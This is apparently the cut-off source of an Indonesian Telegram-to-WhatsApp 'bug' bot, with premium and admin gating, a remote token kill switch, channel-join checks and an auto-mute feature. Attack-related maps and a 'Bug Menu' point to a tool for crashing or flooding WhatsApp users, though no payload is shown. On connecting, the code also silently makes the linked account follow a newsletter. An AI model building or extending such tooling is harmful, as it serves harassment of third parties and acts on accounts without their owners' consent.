const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  // Fungsi Utama & Soket
  makeWASocket,
  makeMessagesSocket,
  WASocket,
  baileys,
  isBaileys,

  // Autentikasi & Penyimpanan Data
  useMultiFileAuthState,
  useSingleFileAuthState,
  makeInMemoryStore,
  makeCacheableSignalKeyStore,
  initInMemoryKeyStore,
  AuthenticationState,

  // Versi & Koneksi
  fetchLatestBaileysVersion,
  fetchLatestWaWebVersion,
  DisconnectReason,
  ReconnectMode,

  // Konten & Pembuatan Pesan
  generateWAMessage,
  generateWAMessageFromContent,
  generateForwardMessageContent,
  generateMessageID,
  patchMessageBeforeSending,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  encodeNewsletterMessage,
  prepareWAMessageMedia,
  downloadAndSaveMediaMessage,
  downloadContentFromMessage,

  // Struktur & Tipe Pesan (Proto)
  proto,
  WAProto,
  WAProto_1,
  WAMessageProto,
  MessageTypeProto,
  AnyMessageContent,
  WAMessageContent,
  WAMessage,
  MessageOptions,
  MiscMessageGenerationOptions,
  MessageRetryMap,

  // Tipe Spesifik Pesan
  interactiveMessage,
  InteractiveMessage,
  nativeFlowMessage,
  listMessage,
  templateMessage,
  extendedTextMessage,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  Header,

  // Utilitas JID (Nomor WhatsApp)
  areJidsSameUser,
  jidDecode,
  jidEncode,
  mentionedJid,

  // Metadata Grup
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,

  // Utilitas Media & Network
  MediaType,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  WAMediaUpload,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  ProxyAgent,

  // Status & Event Lainnya
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ChatModification,
  Browser,
  Browsers,
  MessageType,
  Presence,
  WANode,
  WAMetric,
  WAFlag,
  WAContextInfo,
  BaileysError,

  // Fungsi Parser Tambahan
  getContentType,
  getAggregateVotesInPollMessage,
  getButtonType,
  getStream,
  processTime,

  // Variabel Custom / Typo dari script asal (Bisa dihapus jika error)
  targetDecode,
  mentionedtarget,
  relayWAMessage
} = require("@whiskeysockets/baileys");

const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const vm = require('vm');
const https = require('https');
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
const userBugSelection = new Map();
const attackConfig = new Map();
const multiBugSession = new Map();
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./Db/premiums.json";
const adminFile = "./Db/admins.json";
const dbPath = "./Db/ControlCommand.json";
const cooldownFile = './Db/cooldown.json'
// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

function loadDB() {
if (!fs.existsSync(dbPath)) return {}
return JSON.parse(fs.readFileSync(dbPath))
}

function saveDB(data) {
fs.writeFileSync(dbPath, JSON.stringify(data, null, 2))
}

if (!fs.existsSync(dbPath)) {
  fs.writeFileSync(dbPath, JSON.stringify({ commands: {} }, null, 2));
}
// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);


// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = async (ctx, next) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat?.id.toString();

  const bisaAkses =
    premiumUsers.includes(userId) ||
    isGroupPremium(chatId) ||
    ctx.from.id.toString() === OWNER_ID;

  if (!bisaAkses) {
    await ctx.reply(
      '❌ Fitur ini khusus *Premium!*\n\n' +
      '💡 Hubungi owner untuk upgrade premium.',
      { parse_mode: 'Markdown' }
    );
    return;
  }

  return next();
};


const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}
// === Fungsi Admin / Premium ===
const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://l.top4top.io/p_3803smv0s1.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];
// Func Block/Unblock Command
const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();

  const text = ctx.message.text.trim();

  if (!text.startsWith("/")) return next();

  // ambil command utama
  let cmd = text.split(" ")[0].toLowerCase();

  // hapus @botusername
  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }

  const db = loadDB();
  const chatId = String(ctx.chat.id);

  // =========================
  // GLOBAL DISABLE COMMAND
  // =========================
  if (db.commands?.[cmd]?.disabled) {
    return ctx.reply(
      db.commands[cmd].reason ||
      "⛔ Command ini dimatikan."
    );
  }

  // =========================
  // BLOCK COMMAND CHAT
  // =========================
  const blocked =
    db.groupCmdBlock?.[chatId] || [];

  // normalize semua cmd
  const normalizedBlocked = blocked.map(c =>
    c.toLowerCase().split("@")[0]
  );

  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply(
      "⛔ Command ini diblock di chat ini."
    );
  }

  return next();
};

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/DAFARELXP/BLOODDB/refs/heads/main/tokens.json";

bot.telegram.setMyCommands([
  { command: 'start', description: 'Developer Tercinta @Xyzenofficial' },
  { command: 'antipromo', description: 'Toggle anti promosi per group' },
  { command: 'privatemute', description: 'Toggle auto mute private chat' },
]).then(() => {
  console.log('Daftar perintah berhasil diperbarui!');
}).catch((error) => {
  console.error('Gagal memperbarui perintah:', error);
});

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL, { timeout: 8000 });
    return response.data.tokens || [];
  } catch (err) {
    console.error(chalk.red("❌ Gagal Di Variabel Raw Github."), err.message || "");
    return [];
  }
}

async function validateToken() {
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.error(chalk.red("❌ Token Terdeteksi Penyusup keluar...!!"));
    process.exit(1);
  }
  startBot();
}

function startBot() {
  console.clear();
  console.log(chalk.cyan(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢤⠠⡔⣰⢂⡲⣄⠢⢄⠠⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⠰⡇⢾⣬⣷⣽⣧⣿⣵⣾⠽⡎⡶⠡⠌⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠲⣢⢹⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠡⢘⣥⣻⢬⢻⣿⣿⣿⣿⣿⣿⣤⢿⣱⢷⢔⡀⠂⠄⠀⠀⠀⠀⠀⠀⠀⡈⡌⣰⣸⠘⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⢂⡔⣧⣮⡾⣺⣗⣯⡿⠿⠿⠿⠾⣯⡽⣻⣭⡫⡻⣭⡘⠄⡀⠀⠀⠀⠀⠀⠁⠤⠍⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⡐⢡⢊⢮⣾⣻⣪⡮⠊⠁⠀⠀⠀⠀⠀⠀⠈⢓⡷⡙⣮⡪⡻⡰⣀⠔⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⢀⠐⢂⣏⢻⣏⠓⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢋⡟⣿⣾⣿⣇⡟⣉⣿⡖⢳⣾⣰⣶⣀⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠐⡠⢐⡼⣮⢯⣝⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣾⣽⣿⣿⣿⣿⣿⣾⣯⢿⣿⣷⡯⠛⠤⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣂⡡⢚⣯⣯⣿⣾⡧⠀⠆⠀⠀⠀⠀⠀⠀⢀⣀⣠⣠⣤⣾⣿⣿⣿⣿⣿⣿⣿⠿⡟⠟⠩⠁⠂⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣤⣧⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⠟⢫⠙⠠⠁⠸⠄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠄⣠⣤⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣏⡉⡿⡈⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢤⡚⡽⢿⢿⡿⣿⢿⡿⠿⠿⠿⠻⠯⠿⣿⣿⣯⣻⣿⠽⠟⠟⠛⠻⢛⡩⣵⡟⡢⣟⠏⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠁⠀⠂⠐⠀⠂⠀⠁⠈⠀⠁⠀⠂⠘⠫⣓⡷⡇⣿⣯⣴⣬⣿⡗⣟⣾⡿⡡⢊⠐⢀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠳⡝⣷⢾⢧⡷⣿⣿⠿⠉⡈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠠⠀⠃⡜⢚⠓⠃⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

`));

console.log(chalk.greenBright(`
┌─────────────────────────────┐
│ ⚠️ inicialização em execução com sucesso  
├─────────────────────────────┤
│ DESENVOLVEDOR : Pinzy | Xyzen 
│ TELEGRAMA : @xyzenofficial
│ CHANAL : @XylentOfficial
└─────────────────────────────┘
`));
  console.log(chalk.blue(" 𝐗𝐲𝐥𝐞𝐧𝐭 Is Here...!"));
  console.log(chalk.magenta("🔐 Semua Terkunci."));
};

/*validateToken(); 
buat validate token kalo lu mau kasih db nya*/
validateToken(); 

async function checkExpired() {

    const EXPIRED = new Date("2050-05-15T07:25:00Z").getTime()

    try {

        // ambil waktu server dari header
        const res = await axios.get("https://google.com")
        const now = new Date(res.headers.date).getTime()

        const diff = EXPIRED - now

        if (diff <= 0) {
            console.log("❌ SCRIPT EXPIRED, MOHON UNTUK MENUNGGU UPDATE DARI @xyzenofficial")
            process.exit(0);
        }

        const hari = Math.floor(diff / 86400000)
        const jam = Math.floor((diff % 86400000) / 3600000)

        console.log(`✅ SCRIPT ONLINE | WAKTU TOLERANSI TERSISA | ${hari} HARI ${jam} JAM LAGI`)

    } catch {
        console.log("⚠️ Gagal cek waktu internet")
    }

}

checkExpired();
// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'] 
    };


  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      sock.newsletterFollow("0029Vb82CCx9sBI5CeFqNY2T@newsletter");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
❌ WhatsApp Belum terhubung
`);
return;
}
next();
};

////=========PRIVATE CHAT GUARD + AUTO MUTE LOG========\\\\

// Config - isi sesuai kebutuhan
const OWNER_ID = '8768626313'; // ganti dengan ID owner
const LOG_GROUP_ID = '-1003973782800'; // ganti dengan ID group log

// Helper: format tanggal & waktu lengkap
function formatDateTime(date) {
  const hari = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
  const bulan = ['Januari','Februari','Maret','April','Mei','Juni',
                 'Juli','Agustus','September','Oktober','November','Desember'];
  const d = new Date(date);
  const namaHari = hari[d.getDay()];
  const tanggal = d.getDate();
  const namaBulan = bulan[d.getMonth()];
  const tahun = d.getFullYear();
  const jam = String(d.getHours()).padStart(2, '0');
  const menit = String(d.getMinutes()).padStart(2, '0');
  const detik = String(d.getSeconds()).padStart(2, '0');
  return `${namaHari}, ${tanggal} ${namaBulan} ${tahun} — ${jam}:${menit}:${detik}`;
}

function getRealTime() {
  const now = new Date();
  const hari = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
  const bulan = ['Januari','Februari','Maret','April','Mei','Juni',
                 'Juli','Agustus','September','Oktober','November','Desember'];
  const Hari = hari[now.getDay()];
  const tanggalnew = now.getDate();
  const Bulan = bulan[now.getMonth()];
  const tahunnew = now.getFullYear();
  return `${Hari}, ${tanggalnew} ${Bulan} ${tahunnew}`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

// Middleware: deteksi private chat & auto mute
let autoMuteEnabled = true;

// Durasi mute dalam ms (2 menit)
const MUTE_DURATION_MS = 2 * 60 * 1000;

// Map menyimpan userId → timestamp kapan mute berakhir
const mutedUsers = new Map();

// ── Helper: format tanggal ──────────────────────────────────
function formatDateTime(date) {
  return date.toLocaleString('id-ID', {
    day: '2-digit', month: '2-digit', year: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    hour12: false
  });
}

// ── Command: /privatemute on|off  (OWNER ONLY) ─────────────
bot.command('privatemute', async (ctx) => {
  const userId = ctx.from.id.toString();

  // Hanya owner yang bisa pakai command ini
  if (userId !== OWNER_ID.toString()) {
    return ctx.reply('⛔ Kamu tidak memiliki izin untuk menggunakan command ini.');
  }

  const arg = (ctx.message.text.split(' ')[1] || '').toLowerCase();

  if (arg === 'on') {
    autoMuteEnabled = true;
    return ctx.reply(
      `✅ *Auto-Mute Private Chat* telah *diaktifkan!*\n` +
      `Setiap user yang DM bot akan otomatis di-mute 2 menit.`,
      { parse_mode: 'Markdown' }
    );
    } else if (arg === 'off') {
    autoMuteEnabled = false;
    mutedUsers.clear(); // <── Tambahkan ini agar semua daftar mute langsung dihapus bersih!
    return ctx.reply(
      `🔕 *Auto-Mute Private Chat* telah *dinonaktifkan!*\n` +
      `Semua user telah dibebaskan dan bebas DM bot.`,
      { parse_mode: 'Markdown' }
    );

  } else {
    const status = autoMuteEnabled ? '🟢 *ON*' : '🔴 *OFF*';
    return ctx.reply(
      `ℹ️ Status Auto-Mute Private Chat: ${status}\n\n` +
      `Gunakan:\n` +
      `• \`/privatemute on\` — aktifkan\n` +
      `• \`/privatemute off\` — nonaktifkan`,
      { parse_mode: 'Markdown' }
    );
  }
});

// ── Middleware: Deteksi private chat & auto mute ───────────
bot.use(async (ctx, next) => {
  // Hanya tangkap pesan di private chat
  if (ctx.chat?.type !== 'private') return next();

  // Jangan proses command /start & /privatemute
  const text = ctx.message?.text || '';
  if (text.startsWith('/start') || text.startsWith('/privatemute')) return next();

  const user = ctx.from;
  const userId = user.id.toString();
  const username = user.username ? `@${user.username}` : `#${userId}`;
  const fullName = `${user.first_name || ''}${user.last_name ? ' ' + user.last_name : ''}`.trim();

  // ── OWNER BYPASS: owner tidak pernah kena mute ──────────
  if (userId === OWNER_ID.toString()) {
    return next();
  }

  // 🔥 [PERBAIKAN] Cek fitur aktif/mati ditaruh di sini!
  // Jika fitur MATI, langsung loloskan tanpa cek status mute yang tersisa
  if (!autoMuteEnabled) {
    return next();
  }

  // ── Cek apakah user masih dalam status mute ─────────────
  if (mutedUsers.has(userId)) {
    const unmuteTime = mutedUsers.get(userId);
    if (Date.now() < unmuteTime) {
      const sisaMs = unmuteTime - Date.now();
      const sisaMenit = Math.floor(sisaMs / 60000);
      const sisaDetik = Math.floor((sisaMs % 60000) / 1000);
      await ctx.reply(
        `⚠️ Kamu masih dalam status *mute*.\n` +
        `⏳ Sisa waktu: *${sisaMenit} menit ${sisaDetik} detik*`,
        { parse_mode: 'Markdown' }
      );
      return; // stop
    } else {
      // Waktu mute sudah habis, hapus dari map
      mutedUsers.delete(userId);
    }
  }

  // ── User kirim pesan di private → langsung mute ─────────
  const muteStart = new Date();
  const muteEnd = new Date(Date.now() + MUTE_DURATION_MS);
  mutedUsers.set(userId, muteEnd.getTime());

  const logMessage =
    `\`\`\`javascript\n` +
    `┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓\n` +
    `   >> PRIVATE CHAT DETECTED — AUTO MUTE <<\n` +
    `┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
    `╭───〔 𝐋𝐎𝐆 𝐈𝐍𝐅𝐎 〕───╮\n` +
    `│ ◈ USER     : ${username}\n` +
    `│ ◈ NAMA     : ${fullName}\n` +
    `│ ◈ USER ID  : ${userId}\n` +
    `│ ◈ MUTE    : 2 Menit\n` +
    `│ ◈ MULAI   : ${formatDateTime(muteStart)}\n` +
    `│ ◈ BEBAS   : ${formatDateTime(muteEnd)}\n` +
    `╰──────────────────────╯\n` +
    `\`\`\``;

  // Kirim log ke GROUP
  try {
    await ctx.telegram.sendPhoto(LOG_GROUP_ID, 'https://h.top4top.io/p_3804dkqk41.jpg', {
      caption: logMessage,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('Gagal kirim log ke group:', e.message);
  }

  // Kirim log ke OWNER
  try {
    await ctx.telegram.sendPhoto(OWNER_ID, 'https://h.top4top.io/p_3804dkqk41.jpg', {
      caption: logMessage,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('Gagal kirim log ke owner:', e.message);
  }

  // Balas ke user yang kena mute
  await ctx.replyWithPhoto('https://h.top4top.io/p_3804dkqk41.jpg', {
    caption:
      `🚫 Kamu telah di-*mute* selama *2 menit* karena mengirim pesan ke private bot.\n\n` +
      `⏰ *Mulai* : ${formatDateTime(muteStart)}\n` +
      `✅ *Bebas* : ${formatDateTime(muteEnd)}`,
    parse_mode: 'Markdown'
  });

  return; // stop
});

////=========MENU UTAMA========\\\\

const CHANNEL_USERNAME = '@XylentOfficial'; // ganti ini

async function isUserJoined(ctx, userId) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, userId);
    return ['member', 'administrator', 'creator'].includes(member.status);
  } catch (e) {
    return false;
  }
}

// Handler tombol "Sudah Join"
bot.action('check_join', async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id;
  const sudahJoin = await isUserJoined(ctx, userId);

  if (!sudahJoin) {
    await ctx.answerCbQuery('❌ Kamu belum join channel!', { show_alert: true });
    return;
  }

  await ctx.deleteMessage();

  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.id.toString();
  const waktu = getRealTime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";

  const mainMenuMessage = `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   システムオンライン — アクセス許可済み
   >> 開発責任者 — @xyzenofficial <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐘𝐒𝐓𝐄𝐌 𝐋𝐎𝐆 〕───╮
│ ◈ DEV    : @xyzenofficial
│ ◈ SCRIPT : Xylent Empire
│ ◈ USER   : ${Name}
│ ◈ TIME   : ${getUptime()}
│ ◈ DATE   : ${waktu}
│ ◈ STATUS : ${waStatus}
╰──────────────────────╯
\`\`\``;

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          {
        text: "「 👤 」𝐎͢𝐖͡𝐍͜𝐄͢𝐑͡⃟🞇𝐌͜𝐄͢𝐍͡𝐔͜⃟🞇",
        callback_data: "owner_menu",
        style: 'success',
      },
      {
        text: "「 🚀 」 𝐀͢𝐔͡𝐓͜⃟🞇𝐎͢ 𝐔͡𝐏͜𝐃͢𝐀͡𝐓͜⃟🞇𝐄͢",
        callback_data: "all_menu",
        style: 'danger',
      },
      {
        text: "「 🍂 」 𝐁͢𝐮͡𝐠͜⃟🞇𝐌͢e͡𝐧͜𝐮⃟🞇",
        callback_data: "bug_menu",
        style: 'primary',
      }
    ],
    [
    {
        text: "「 🎊 」 𝐅͢𝐈͡𝐓͜𝐔͢𝐑͡𝐄͜⃟🞇𝐓͢𝐎͡𝐎͜𝐋͢𝐒͡⃟🞇𝐌͢𝐄͡𝐍͜𝐔⃟🞇",
        callback_data: "tools_menu",
        style: 'danger',
      }
      ],
      [
      {
        text: "「 🪷 」 𝐈͢𝐍͡𝐅͜𝐎͢𝐑͡𝐌͜𝐀͢𝐒͡𝐈͜⃟🞇𝐒͢𝐂͡𝐑͜𝐈͢𝐏͡𝐓͜⃟🞇",
        url: "https://t.me/XylentOfficial",
        style: 'danger',
      },
        ],
      ],
    },
  });
});

////=========MENU UTAMA========\\\\
bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const Name = ctx.from.username ? `@${ctx.from.username}` : ctx.from.id.toString();
  const waktu = getRealTime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";

  const sudahJoin = await isUserJoined(ctx, userId);

  if (!sudahJoin) {
    const forceMsg = `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   システムオンライン — アクセス許可済み
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 〕───╮
│ ◈ USER   : ${Name}
│ ◈ STATUS : ❌ Belum Join
│
│  Silakan JOIN channel kami
│  terlebih dahulu sebelum
│  menggunakan bot ini!
╰──────────────────────╯
\`\`\``;

    return ctx.replyWithPhoto('https://h.top4top.io/p_3799004cv1.jpg', {
      caption: forceMsg,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          // Pakai @username langsung tanpa link
          [{ text:`「 📢 」 JOIN ${CHANNEL_USERNAME}`, url: `https://t.me/${CHANNEL_USERNAME.replace('@', '')}`, style: 'danger' }],
          [{ text: '「 ✅ 」 Verifikasi', callback_data: 'check_join', style: 'success' }],
        ],
      },
    });
  }

  // Sudah join → menu utama
  const mainMenuMessage = `\`\`\`javascript
┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓
   システムオンライン — アクセス許可済み
   >> 開発責任者 — @xyzenofficial <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐘𝐒𝐓𝐄𝐌 𝐋𝐎𝐆 〕───╮
│ ◈ DEV    : @xyzenofficial
│ ◈ SCRIPT : Xylent Empire
│ ◈ USER   : ${Name}
│ ◈ TIME   : ${getUptime()}
│ ◈ DATE   : ${waktu}
│ ◈ STATUS : ${waStatus}
╰──────────────────────╯
\`\`\``;

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          {
        text: "「 👤 」𝐎͢𝐖͡𝐍͜𝐄͢𝐑͡⃟🞇𝐌͜𝐄͢𝐍͡𝐔͜⃟🞇",
        callback_data: "owner_menu",
        style: 'success',
      },
      {
        text: "「 🚀 」 𝐀͢𝐔͡𝐓͜⃟🞇𝐎͢ 𝐔͡𝐏͜𝐃͢𝐀͡𝐓͜⃟🞇𝐄͢",
        callback_data: "all_menu",
        style: 'danger',
      },
      {
        text: "「 🍂 」 𝐁͢𝐮͡𝐠͜⃟🞇𝐌͢e͡𝐧͜𝐮⃟🞇",
        callback_data: "bug_menu",
        style: 'primary',
      }
    ],
    [
    {
        text: "「 🎊 」 𝐅͢𝐈͡𝐓͜𝐔͢𝐑͡𝐄͜⃟🞇𝐓͢𝐎͡𝐎͜𝐋͢𝐒͡⃟🞇𝐌͢𝐄͡𝐍͜𝐔⃟🞇",
        callback_data: "tools_menu",
        style: 'danger',
      }
      ],
      [
      {
        text: "「 🪷 」 𝐈͢𝐍͡𝐅͜𝐎͢𝐑͡𝐌͜𝐀͢𝐒͡𝐈͜⃟🞇𝐒͢𝐂͡𝐑͜𝐈͢𝐏͡𝐓͜⃟🞇",
        url: "https://t.me/Xylent EmpireInfo02",
        style: 'danger',
      },
        ],
      ],
    },
  });
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `\`\`\`
╭━───━⊱ ⊱⪩ 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /addsender 62xxx
┃❏ /delsesi
┃❏ /addpremgroup <add all member>
┃❏ /delpremgroup <delete acces all memb>
┃❏ /addpremgroupid <ɪᴅ>
┃❏ /delpremgroupid
┃❏ /cekpremgroup
┃❏ /listpremgroup
┃❏ /blockcmd  <Block command bug>
┃❏ /unblockcmd <Unblock command bug>
┃❏ /listblockcmd <list command>
┃❏ /addadmin <ɪᴅ>
┃❏ /deladmin <ɪᴅ>
┃❏ /addprem <ɪᴅ>
┃❏ /delprem <ɪᴅ>
┃❏ /cekprem <ᴄᴇᴋ>
┃❏ /setcd 
